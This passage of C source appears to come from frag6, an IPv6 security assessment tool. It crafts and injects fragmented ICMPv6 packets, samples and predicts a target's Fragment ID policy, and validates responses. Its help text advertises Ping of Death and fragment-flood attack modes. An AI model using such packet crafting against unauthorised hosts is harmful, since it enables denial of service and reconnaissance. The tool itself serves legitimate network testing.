	if(dstoptuhdr_f){
		dstoptuhdrs=0;
	
		while(dstoptuhdrs < ndstoptuhdr){
			if((ptr+ dstoptuhdrlen[dstoptuhdrs]) > (v6buffer+ idata->mtu)){
				puts("Packet too large while processing Dest. Opt. Header (Unfrag. Part)");
				return(-1);
			}

			*prev_nh = IPPROTO_DSTOPTS;
			prev_nh = ptr;
			memcpy(ptr, dstoptuhdr[dstoptuhdrs], dstoptuhdrlen[dstoptuhdrs]);
			ptr = ptr + dstoptuhdrlen[dstoptuhdrs];
			dstoptuhdrs++;
		}
	}

	/* Check that we are able to send the Unfragmentable Part, together with a 
	   Fragment Header and a chunk data over our link layer
	 */
	if( (ptr+sizeof(struct ip6_frag)+fsize) > (v6buffer+idata->mtu)){
		puts("Unfragmentable part too large for current MTU (1500 bytes)");
		return(-1);
	}

	/* We prepare a separete Fragment Header, but we do not include it in the packet to be sent.
	   This Fragment Header will be used (an assembled with the rest of the packet by the 
	   send_packet() function.
	*/
	fh= (struct ip6_frag *) ptr;
	bzero(ptr, FRAG_HDR_SIZE);

	fh->ip6f_ident= htonl(id);

	if(forder == LAST_FRAGMENT || forder == ATOMIC_FRAGMENT)
		m=0;
	else
		m=IP6F_MORE_FRAG;

	if((forder==FIRST_FRAGMENT || forder==ATOMIC_FRAGMENT) && !foffset_f)
		offset=0;

	fh->ip6f_offlg = (htons(offset) & IP6F_OFF_MASK) | m;

	*prev_nh = IPPROTO_FRAGMENT;
	prev_nh = (unsigned char *) fh;

	ptr+= sizeof(struct ip6_frag);

	if(dstopthdr_f){
		dstopthdrs=0;
	
		while(dstopthdrs < ndstopthdr){
			if((ptr+ dstopthdrlen[dstopthdrs]) > (v6buffer+max_packet_size)){
				puts("Packet too large while processing Dest. Opt. Header (should be using the Frag. option?)");
				return(-1);
			}
    
			*prev_nh = IPPROTO_DSTOPTS;
			prev_nh = ptr;
			memcpy(ptr, dstopthdr[dstopthdrs], dstopthdrlen[dstopthdrs]);
			ptr = ptr + dstopthdrlen[dstopthdrs];
			dstopthdrs++;
		}
	}

	*prev_nh = IPPROTO_ICMPV6;

	if(forder == FIRST_FRAGMENT || forder == ATOMIC_FRAGMENT){
		if((ptr+ fsize) > (v6buffer+max_packet_size)){
			puts("Packet too large while inserting ICMPv6 header");
			return(-1);
		}

		if(!fsize_f && (forder != LAST_FRAGMENT && forder != ATOMIC_FRAGMENT)){
			fsize= (fsize>>3) << 3;
		}

		if(fsize < sizeof(struct icmp6_hdr)){
			if(idata->verbose_f)
				puts("Fragment size too large to hold an ICMPv6 header");

			return(-1);
		}

		icmp6 = (struct icmp6_hdr *) ptr;
		icmp6->icmp6_type = ICMP6_ECHO_REQUEST;
		icmp6->icmp6_code = 0;
		icmp6->icmp6_cksum = 0;
		icmp6->icmp6_data16[0]= htons(getpid());	/* Identifier */
		icmp6->icmp6_data16[1]= htons(random());		/* Sequence Number */

		ptr+= sizeof(struct icmp6_hdr);
		fsize-= sizeof(struct icmp6_hdr);

		if(tstamp_f && fsize >= (sizeof(time_t)+sizeof(u_int32_t))){
			if((ptr+ (sizeof(time_t) + sizeof(u_int32_t))) > (v6buffer+max_packet_size)){
				puts("Packet too large while inserting timestamp");
				return(-1);
			}

			/* We include a timstamp to be able to measure the Fragment Reassembly timeout */
			tstamp= time(NULL);
			*(time_t *)ptr= tstamp;
			ptr+= sizeof(time_t);

			/* We include a "checksum" such that we can tell the responses we elicit from other packets */
			*(u_int32_t *)ptr= (u_int32_t)tstamp ^ 0xabcdabcd;
			ptr+= sizeof(u_int32_t);
			

			if(fsize > (sizeof(time_t)+sizeof(u_int32_t)))
				fsize-= (sizeof(time_t)+sizeof(u_int32_t));
			else
				fsize=0;
		}

		for(i=0; i< (fsize/4); i++){
			*(u_int32_t *)ptr = random();
			ptr += sizeof(u_int32_t);
		}

		ipv6->ip6_plen= htons(ptr-(v6buffer + MIN_IPV6_HLEN));
		icmp6->icmp6_cksum = in_chksum(v6buffer, icmp6, ptr-((unsigned char *)icmp6), IPPROTO_ICMPV6);
	}
	else{
		if(tstamp_f){
			if((ptr+ (sizeof(time_t) + sizeof(u_int32_t))) > (v6buffer+max_packet_size)){
				puts("Packet too large while inserting timestamp");
				return(-1);
			}

			/* We include a timstamp to be able to measure the Fragment Reassembly timeout */
			tstamp= time(NULL);
			*(time_t *)ptr= tstamp;
			ptr+= sizeof(time_t);

			/* We include a "checksum" such that we can tell the responses we elicit from other packets */
			*(u_int32_t *)ptr= (u_int32_t)tstamp ^ 0xabcdabcd;
			

			if(fsize > (sizeof(time_t)+sizeof(u_int32_t)))
				fsize-= (sizeof(time_t)+sizeof(u_int32_t));
			else
				fsize=0;
		}


		if(!fsize_f && (forder != LAST_FRAGMENT && forder != ATOMIC_FRAGMENT)){
			fsize= (fsize>>3) << 3;
		}

		if((ptr+ (sizeof(time_t) + sizeof(u_int32_t))) > (v6buffer+max_packet_size)){
			puts("Packet too large while inserting timestamp");
			return(-1);
		}

		for(i=0; i<(fsize/4); i++){
			*(u_int32_t *)ptr = random();
			ptr += sizeof(u_int32_t);
		}

		ipv6->ip6_plen= htons(ptr-(v6buffer + MIN_IPV6_HLEN));
	}

	if((nw=pcap_inject(idata->pfd, buffer, ptr - buffer)) == -1){
		printf("pcap_inject(): %s\n", pcap_geterr(idata->pfd));
		return(-1);
	}

	if(nw != (ptr- buffer)){
		printf("pcap_inject(): only wrote %lu bytes (rather than %lu bytes)\n", (LUI) nw, (LUI) (ptr-buffer));
		return(-1);
	}

	return 0;
}


/*
 * Function: send_fid_probe()
 *
 * Send a fragmented ICMPv6 Echo Request used for sampling the Fragment Identification
 * values sent by the target
 */
int send_fid_probe(struct iface_data *idata){
	unsigned char		fragbuffer[FRAG_BUFFER_SIZE];
	struct ip6_frag		*frag;
	struct ether_header	*ethernet;
	struct ip6_hdr		*ipv6;
	unsigned char		*fptr, *fptrend;
	unsigned int		i;

	ethernet= (struct ether_header *) buffer;
	v6buffer = buffer + idata->linkhsize;
	ipv6 = (struct ip6_hdr *) v6buffer;

	if(idata->type == DLT_EN10MB && idata->flags != IFACE_LOOPBACK){
		ethernet->src = idata->hsrcaddr;
		ethernet->dst = idata->hdstaddr;
		ethernet->ether_type = htons(ETHERTYPE_IPV6);
	}
	else if(idata->type == DLT_NULL){
		dlt_null->family= PF_INET6;
	}

	ipv6->ip6_flow=0;
	ipv6->ip6_vfc= 0x60;
	ipv6->ip6_hlim= hoplimit;
	ipv6->ip6_src= idata->srcaddr;
	ipv6->ip6_dst= idata->dstaddr;
	ipv6->ip6_nxt= IPPROTO_FRAGMENT;

	/* ptr always points to the part of the original packet that is being crafted */
	ptr = (unsigned char *) v6buffer + sizeof(struct ip6_hdr);

	frag= (struct ip6_frag *) ptr;
	bzero(frag, sizeof(struct ip6_frag));
	frag->ip6f_nxt= IPPROTO_ICMPV6;

	ptr+= sizeof(struct ip6_frag);

	/* fragpart points to the beginning of the fragmentable part of the original packet */
	fragpart= ptr;

	icmp6 = (struct icmp6_hdr *) ptr;
	icmp6->icmp6_type = ICMP6_ECHO_REQUEST;
	icmp6->icmp6_code = 0;
	icmp6->icmp6_cksum = 0;
	icmp6->icmp6_data16[0]= htons(getpid());	/* Identifier */
	icmp6->icmp6_data16[1]= htons(random());	/* Sequence Number */

	ptr+= sizeof(struct icmp6_hdr);
	*(u_int32_t *)ptr= icmp6_sig;
	ptr+= sizeof(u_int32_t);

	for(i=0;i<400; i++){
		*(u_int32_t *)ptr= random();
		ptr+=sizeof(u_int32_t);
	}

	icmp6->icmp6_cksum = in_chksum(v6buffer, icmp6, ptr-(unsigned char *)icmp6, IPPROTO_ICMPV6);

	/* ptrend points to the end of the original packet */
	ptrend= ptr;
	ptr= fragpart;

	/* fptr points to the part of the fragment that is being crafted */
	fptr = fragbuffer;
	fipv6 = (struct ip6_hdr *) (fragbuffer + idata->linkhsize);
	fptrend = fptr + FRAG_BUFFER_SIZE;

	/* Copy everything from the Ethernet header, up to (and including) the Fragmentation Header */
	memcpy(fptr, buffer, fragpart-buffer);
	fptr = fptr + (fragpart-buffer);

	fh= (struct ip6_frag *) (fragbuffer + idata->linkhsize + sizeof(struct ip6_hdr));
	fh->ip6f_ident=random();
	startoffragment = fptr;

	/* We'll be sending packets of at most 1280 bytes (the IPv6 minimum MTU) */
	fragsize= ((MIN_IPV6_MTU - sizeof(struct ip6_hdr) - sizeof(struct ip6_frag)) >> 3) << 3;

	/*
	 * Check that the selected fragment size is not larger than the largest 
	 * fragment size that can be sent. This chec will always be passed, but is useful
	 * when future versions of the tool support other link-layer technologies.
	 */

	if( (startoffragment + fragsize) > fptrend){
		printf("Fragment size too large to fit into fragmentation buffer\n");
		return(-1);
	}

	m=IP6F_MORE_FRAG;

	while((ptr< ptrend) && m==IP6F_MORE_FRAG){
		fptr= startoffragment;

		if( (ptrend-ptr) <= fragsize){
			fragsize= ptrend-ptr;
			m=0;
		}

		memcpy(fptr, ptr, fragsize);
		fh->ip6f_offlg = (htons(ptr-fragpart) & IP6F_OFF_MASK) | m;
		ptr+=fragsize;
		fptr+=fragsize;

		fipv6->ip6_plen = htons((fptr - fragbuffer) - MIN_IPV6_HLEN - idata->linkhsize);
		
		if((nw=pcap_inject(idata->pfd, fragbuffer, fptr - fragbuffer)) == -1){
			printf("pcap_inject(): %s\n", pcap_geterr(idata->pfd));
			return(-1);
		}

		if(nw != (fptr- fragbuffer)){
			printf("pcap_inject(): only wrote %lu bytes (rather than %lu bytes)\n", \
												(LUI) nw, (LUI) (ptr-buffer));
			return(-1);
		}
	} /* Sending fragments */

	return(0);
}


/*
 * Function: usage()
 *
 * Prints the syntax of the frag6 tool
 */
void usage(void){
	puts("usage: frag6 -i INTERFACE -d DST_ADDR [-S LINK_SRC_ADDR] [-D LINK-DST-ADDR]\n"
	     "       [-s SRC_ADDR[/LEN]] [-A HOP_LIMIT] [-u DST_OPT_HDR_SIZE]\n"
	     "       [-U DST_OPT_U_HDR_SIZE] [-H HBH_OPT_HDR_SIZE] [-P FRAG_SIZE]\n"
	     "       [-O FRAG_TYPE] [-o FRAG_OFFSET] [-I FRAG_ID] [-T] [-n]\n"
	     "       [-p | -W | -X | -F N_FRAGS] [-l] [-z SECONDS] [-v] [-h]");
}


/*
 * Function: print_help()
 *
 * Prints help information for the frag6 tool
 */
void print_help(void){
	puts(SI6_TOOLKIT);
	puts( "frag6: A security assessment tool for attack vectors based on IPv6 fragments\n");
	usage();
    
	puts("\nOPTIONS:\n"
	     "  --interface, -i           Network interface\n"
	     "  --link-src-address, -S    Link-layer Destination Address\n"
	     "  --link-dst-address, -D    Link-layer Source Address\n"
	     "  --src-address, -s         IPv6 Source Address\n"
	     "  --dst-address, -d         IPv6 Destination Address\n"
	     "  --hop-limit, -A           IPv6 Hop Limit\n"
	     "  --dst-opt-hdr, -u         Destination Options Header (Fragmentable Part)\n"
	     "  --dst-opt-u-hdr, -U       Destination Options Header (Unfragmentable Part)\n"
	     "  --hbh-opt-hdr, -H         Hop by Hop Options Header\n"
	     "  --frag-size, -P           IPv6 fragment payload size\n"
	     "  --frag-type, -O           IPv6 Fragment Type {first, last, middle, atomic}\n"
	     "  --frag-offset, -o         IPv6 Fragment Offset\n"
	     "  --frag-id, -I             IPv6 Fragment Identification\n"
	     "  --no-timestamp, -T        Do not include a timestamp in the payload\n"
	     "  --no-responses, -n        Do not print responses to transmitted packets\n"
	     "  --frag-reass-policy, -p   Assess fragment reassembly policy\n"
	     "  --frag-id-policy, -W      Assess the Fragment ID generation policy\n"
	     "  --pod-attack, -X          Perform a 'Ping of Death' attack\n"
	     "  --flood-frags, -F         Flood target with IPv6 fragments\n"
	     "  --loop, -l                Send IPv6 fragments periodically\n"
	     "  --sleep, -z               Pause between sending IPv6 fragments\n"
	     "  --verbose, -v             Be verbose\n"
	     "  --help, -h                Print help for the frag6 tool\n"
	     "\n"
	     "Programmed by Fernando Gont for SI6 Networks (http://www.si6networks.com)\n"
	     "Please send any bug reports to <fgont@si6networks.com>\n"
	);
}


/*
 * Function: print_attack_info()
 *
 * Prints attack details (when the verbose ("-v") option is specified).
 */
 
void print_attack_info(struct iface_data *idata){
	if(idata->type == DLT_EN10MB && idata->flags != IFACE_LOOPBACK){
		if(ether_ntop(&(idata->hsrcaddr), plinkaddr, sizeof(plinkaddr)) == 0){
			puts("ether_ntop(): Error converting address");
			exit(EXIT_FAILURE);
		}

		printf("Ethernet Source Address: %s%s\n", plinkaddr, (!idata->hsrcaddr_f)?" (automatically selected)":"");

		/* 
		   Ethernet Destination Address only used if a IPv6 Destination Address or an
		   Ethernet Destination Address were specified.
		 */
		if(ether_ntop(&(idata->hdstaddr), plinkaddr, sizeof(plinkaddr)) == 0){
			puts("ether_ntop(): Error converting address");
			exit(EXIT_FAILURE);
		}

		printf("Ethernet Destination Address: %s%s\n", plinkaddr, (!idata->hdstaddr_f)?" (automatically selected)":"");
	}

	if(inet_ntop(AF_INET6, &(idata->srcaddr), psrcaddr, sizeof(psrcaddr)) == NULL){
		puts("inet_ntop(): Error converting IPv6 Source Address to presentation format");
		exit(EXIT_FAILURE);
	}

	if(idata->dstaddr_f){
		printf("IPv6 Source Address: %s%s\n", psrcaddr, ((!idata->srcaddr_f)?" (automatically selected)":""));
	}

	if(inet_ntop(AF_INET6, &(idata->dstaddr), pdstaddr, sizeof(pdstaddr)) == NULL){
		puts("inet_ntop(): Error converting IPv6 Destination Address to presentation format");
		exit(EXIT_FAILURE);
	}

	printf("IPv6 Destination Address: %s\n", pdstaddr);

	printf("IPv6 Hop Limit: %u%s\n", hoplimit, (hoplimit_f)?"":" (randomized)");

	for(i=0; i<ndstoptuhdr; i++)
		printf("Destination Options Header (Unfragmentable part): %u bytes\n", dstoptuhdrlen[i]);

	for(i=0; i<nhbhopthdr; i++)
		printf("Hop by Hop Options Header: %u bytes\n", hbhopthdrlen[i]);

	for(i=0; i<ndstopthdr; i++)
		printf("Destination Options Header: %u bytes\n", dstopthdrlen[i]);
}


/*
 * Function: valid_icmp6_response()
 *
 * Checks whether the response to an ICMPv6 probe is valid
 */

int valid_icmp6_response(struct iface_data *idata, struct pcap_pkthdr *pkthdr, const u_char *pktdata){

	struct ether_header	*pkt_ether;
	struct ip6_hdr		*pkt_ipv6, *pkt_ipv6_ipv6;
	struct ip6_ext		*pkt_ext;
	struct icmp6_hdr	*pkt_icmp6, *pkt_icmp6_icmp6;
	struct ip6_frag		*pkt_fh_fh;
	unsigned char		*pkt_end, *pkt_ptr;
	u_int8_t			pkt_prev_nh;
	unsigned int		minfragsize;

	pkt_ether = (struct ether_header *) pktdata;
	pkt_ipv6 = (struct ip6_hdr *)((char *) pkt_ether + idata->linkhsize);
	pkt_icmp6 = (struct icmp6_hdr *) ((char *) pkt_ipv6 + MIN_IPV6_HLEN);
	pkt_icmp6_icmp6= (struct icmp6_hdr *) ((unsigned char *) pkt_icmp6 + sizeof(struct icmp6_hdr) +\
						sizeof(struct ip6_hdr) + MIN_HBH_LEN);

	pkt_end = (unsigned char *) pktdata + pkthdr->caplen;

	/* The packet length is the minimum of what we capured, and what is specified in the
	   IPv6 Total Lenght field
	 */
	if( pkt_end > ((unsigned char *)pkt_icmp6 + pkt_ipv6->ip6_plen) )
		pkt_end = (unsigned char *)pkt_icmp6 + pkt_ipv6->ip6_plen;

	switch(pkt_icmp6->icmp6_type){
		case ICMP6_ECHO_REPLY:
			/*
			   Discard the packet if it is not of the minimum size to contain an ICMPv6 
			   header and the payload we included in the ICMPv6 Echo Request
			 */
			if( (pkt_end - (unsigned char *) pkt_icmp6) < (sizeof(struct icmp6_hdr) + \
									fsize) && (pkt_end - (unsigned char *) pkt_ipv6) < MIN_IPV6_MTU){
				return 0;
			}

			/* Check that the ICMPv6 checksum is correct */
			if(in_chksum(pkt_ipv6, pkt_icmp6, pkt_end-((unsigned char *)pkt_icmp6), IPPROTO_ICMPV6) != 0){
				return 0;
			}

			if(pkt_icmp6->icmp6_data16[0] != htons(getpid())){
				return 0;
			}


			if(tstamp_f){
				pkt_ptr= ((unsigned char *) pkt_icmp6+ sizeof(struct icmp6_hdr));
				if( *(u_int32_t *) pkt_ptr != (*(u_int32_t *) (pkt_ptr+sizeof(u_int32_t)) ^ 0xabcdabcd)){
					return 0;
				}
			}

			break;

		case ICMP6_TIME_EXCEEDED:
			/*
			   Discard the packet if it is not of the minimum size to contain an ICMPv6 
			   header and the payload we included in the ICMPv6 Echo Request
			 */
			minfragsize= sizeof(struct ip6_hdr) + sizeof(struct icmp6_hdr)+sizeof(struct ip6_hdr) + \
							sizeof(struct ip6_frag) + sizeof(struct icmp6_hdr) + (fsize_f?fsize:MIN_FRAG_SIZE) + \
							(tstamp_f?(sizeof(time_t)+sizeof(u_int32_t)):0);

			if( ((pkt_end - (unsigned char *) pkt_ipv6) < minfragsize) &&  \
										(pkt_end - (unsigned char *) pkt_ipv6) < MIN_IPV6_MTU){
				return 0;
			}

			pkt_ipv6_ipv6= (struct ip6_hdr *) ((unsigned char *)pkt_icmp6+ sizeof(struct icmp6_hdr));
			pkt_fh_fh= NULL;
			pkt_ext= (struct ip6_ext *) ((unsigned char *)pkt_ipv6_ipv6 + sizeof(struct ip6_hdr));
			pkt_prev_nh= (pkt_ipv6_ipv6->ip6_nxt);

			while(pkt_prev_nh != IPPROTO_ICMPV6 && \
				( (unsigned char *)pkt_ext + (pkt_ext->ip6e_len * 8 + 1)) < pkt_end){

				if(pkt_prev_nh == IPPROTO_FRAGMENT)
					pkt_fh_fh= (struct ip6_frag *) pkt_ext;

				pkt_prev_nh= pkt_ext->ip6e_nxt;
				pkt_ext= (struct ip6_ext *) ( (unsigned char *)pkt_ext + ((pkt_ext->ip6e_len + 1) * 8));
			}

			if(pkt_prev_nh == IPPROTO_ICMPV6){
				pkt_icmp6_icmp6= (struct icmp6_hdr *) pkt_ext;

				if( ((unsigned char *) pkt_icmp6_icmp6 + (sizeof(struct icmp6_hdr)+ sizeof(struct ip6_hdr)+ \
						sizeof(struct ip6_frag)+sizeof(struct icmp6_hdr))) > pkt_end){
					return 0;
				}
			}
			else{
				return 0;
			}

			if(pkt_fh_fh == NULL)
				return 0;

			/*
			 * We can only check the embedded ICMPv6 header if the embedded fragment is the first fragment of
			 * a packet
			 */
			if(ntohs(pkt_fh_fh->ip6f_offlg & IP6F_OFF_MASK) == 0){ 
				if(pkt_icmp6_icmp6->icmp6_type != ICMP6_ECHO_REQUEST){
					return 0;
				}

				if(pkt_icmp6_icmp6->icmp6_data16[0] != htons(getpid())){
					return 0;
				}

				if(tstamp_f){
					pkt_ptr= ((unsigned char *) pkt_icmp6_icmp6+ sizeof(struct icmp6_hdr));
					if( *(u_int32_t *) pkt_ptr != (*(u_int32_t *) (pkt_ptr+sizeof(u_int32_t)) ^ 0xabcdabcd)){
						return 0;
					}
				}
			}
			else{
				return 0;
			}

			break;

		default:
			return 0;
			break;
	}

	/*
	   Check that the Source Address of the Packet is "valid"
	 */
	if(IN6_IS_ADDR_UNSPECIFIED(&(pkt_ipv6->ip6_src))){
		return 0;
	}

	if(IN6_IS_ADDR_LOOPBACK(&(pkt_ipv6->ip6_src))){
		return 0;
	}

	if(IN6_IS_ADDR_MULTICAST(&(pkt_ipv6->ip6_src))){
		return 0;
	}

	/* 
	   Check that that the Destination Address of the incoming packet is one
	   of our addresses.
	 */
	if(!(floodf_f && srcprefix_f) && !is_eq_in6_addr(&(idata->srcaddr), &(pkt_ipv6->ip6_dst))){
		return 0;
	}

	return 1;
}



/*
 * Function: valid_icmp6_response2()
 *
 * Checks whether the response to an ICMPv6 probe (for identifying the fragment reassembly policy) is valid
 */

int valid_icmp6_response2(struct iface_data *idata, struct pcap_pkthdr *pkthdr, const u_char *pktdata, unsigned int minsize){

	struct ether_header	*pkt_ether;
	struct ip6_hdr		*pkt_ipv6, *pkt_ipv6_ipv6;
	struct ip6_ext		*pkt_ext;
	struct icmp6_hdr	*pkt_icmp6, *pkt_icmp6_icmp6;
	struct ip6_frag		*pkt_fh_fh;
	unsigned char		*pkt_end;
	u_int8_t			pkt_prev_nh;

	pkt_ether = (struct ether_header *) pktdata;
	pkt_ipv6 = (struct ip6_hdr *)((char *) pkt_ether + idata->linkhsize);
	pkt_icmp6 = (struct icmp6_hdr *) ((char *) pkt_ipv6 + MIN_IPV6_HLEN);


	pkt_end = (unsigned char *) pktdata + pkthdr->caplen;

	/* The packet length is the minimum of what we capured, and what is specified in the
	   IPv6 Total Lenght field
	 */
	if( pkt_end > ((unsigned char *)pkt_icmp6 + pkt_ipv6->ip6_plen) )
		pkt_end = (unsigned char *)pkt_icmp6 + pkt_ipv6->ip6_plen;

	switch(pkt_icmp6->icmp6_type){
		case ICMP6_ECHO_REPLY:
			/*
			   Discard the packet if it is not of the minimum size to contain an ICMPv6 
			   header and the payload we included in the ICMPv6 Echo Request
			 */
			if( (pkt_end - (unsigned char *) pkt_ipv6) < minsize &&  (pkt_end - (unsigned char *) pkt_ipv6) < MIN_IPV6_MTU){
				return 0;
			}

			/* Check that the ICMPv6 checksum is correct */
			if(in_chksum(pkt_ipv6, pkt_icmp6, pkt_end-((unsigned char *)pkt_icmp6), IPPROTO_ICMPV6) != 0){
				return 0;
			}

			if(pkt_icmp6->icmp6_data16[0] != htons(getpid())){
				return 0;
			}

			break;

		case ICMP6_TIME_EXCEEDED:
			/*
			   Discard the packet if it is not of the minimum size to contain an ICMPv6 
			   header and the payload we included in the ICMPv6 Echo Request
			 */
			if( (pkt_end - (unsigned char *) pkt_ipv6) < minsize \
					&&  (pkt_end - (unsigned char *) pkt_ipv6) < MIN_IPV6_MTU){
				return 0;
			}

			pkt_ipv6_ipv6= (struct ip6_hdr *) ((unsigned char *)pkt_icmp6+ sizeof(struct icmp6_hdr));
			pkt_fh_fh= NULL;
			pkt_ext= (struct ip6_ext *) ((unsigned char *)pkt_ipv6_ipv6 + sizeof(struct ip6_hdr));
			pkt_prev_nh= (pkt_ipv6_ipv6->ip6_nxt);

			while(pkt_prev_nh != IPPROTO_ICMPV6 && \
				( (unsigned char *)pkt_ext + (pkt_ext->ip6e_len * 8 + 1)) < pkt_end){

				if(pkt_prev_nh == IPPROTO_FRAGMENT)
					pkt_fh_fh= (struct ip6_frag *) pkt_ext;

				pkt_prev_nh= pkt_ext->ip6e_nxt;
				pkt_ext= (struct ip6_ext *) ( (unsigned char *)pkt_ext + ((pkt_ext->ip6e_len + 1) * 8));
			}

			if(pkt_prev_nh == IPPROTO_ICMPV6){
				pkt_icmp6_icmp6= (struct icmp6_hdr *) pkt_ext;

				if( ((unsigned char *) pkt_icmp6_icmp6 + (sizeof(struct icmp6_hdr)+ sizeof(struct ip6_hdr)+ \
						sizeof(struct ip6_frag)+sizeof(struct icmp6_hdr))) > pkt_end){
					return 0;
				}
			}
			else{
				return 0;
			}

			if(pkt_fh_fh == NULL){
				return 0;
			}

			/*
			 * We can only check the embedded ICMPv6 header if the embedded fragment is the first fragment of
			 * a packet
			 */
			if(ntohs(pkt_fh_fh->ip6f_offlg & IP6F_OFF_MASK) == 0){ 
				if(pkt_icmp6_icmp6->icmp6_type != ICMP6_ECHO_REQUEST){
					return 0;
				}

				if(pkt_icmp6_icmp6->icmp6_data16[0] != htons(getpid())){
					return 0;
				}

			}
			else{
				return 0;
			}

			break;

		default:
			return 0;
			break;
	}

	/*
	   Check that the Source Address of the Packet is "valid"
	 */
	if(IN6_IS_ADDR_UNSPECIFIED(&(pkt_ipv6->ip6_src))){
		return 0;
	}

	if(IN6_IS_ADDR_LOOPBACK(&(pkt_ipv6->ip6_src))){
		return 0;
	}

	if(IN6_IS_ADDR_MULTICAST(&(pkt_ipv6->ip6_src))){
		return 0;
	}

	/* 
	   Check that that the Destination Address of the incoming packet is one
	   of our addresses.
	 */
	if(!(floodf_f && srcprefix_f) && !is_eq_in6_addr(&(idata->srcaddr), &(pkt_ipv6->ip6_dst))){
		return 0;
	}

	return 1;
}


/*
 * Function: test_frag_pattern()
 *
 * Check whether a specific pattern is present in a portion of an IPv6 fragment
 */
int test_frag_pattern(unsigned char *ptr, unsigned int size, char *block){
	unsigned int i;

	for(i=0; i<size/FRAG_BLOCK_SIZE; i++){
		if(memcmp(ptr, block, FRAG_BLOCK_SIZE) != 0)
			return(0);
	}

	return(1);
}



/*
 * Function: predict_frag_id()
 *
 * Identifies and prints the Fragment Identification generation policy
*/
int predict_frag_id(u_int32_t *s1, unsigned int n1, u_int32_t *s2, unsigned int n2){
	u_int32_t		diff1_avg, diff2_avg;
	double			diff1_sdev, diff2_sdev;

	if(inc_sdev(s1, n1, &diff1_avg, &diff1_sdev) == -1){
		if(verbose_f)
			puts("Error while allocating memory in inc_sdev()");

		return(-1);
	}

	if(inc_sdev(s2, n2, &diff2_avg, &diff2_sdev) == -1){
		if(verbose_f)
			puts("Error while allocating memory in inc_sdev()");

		return(-1);
	}
	

	if(diff1_sdev <= 10){
		if(diff2_sdev <= 10){
			printf("Fragment ID policy: Global IDs with increments of %u (sdev: %f)\n", diff1_avg, diff1_sdev);
		}
		else{
			printf("Fragment ID policy: Per-destination IDs with increments of %u (sdev: %f)\n", diff1_avg, diff1_sdev);
		}
	}
	else{
		printf("Fragment ID policy: Randomized IDs (Avg. inc.: %u, sdev: %f)\n", diff1_avg, diff1_sdev);
	}

	return(0);
}

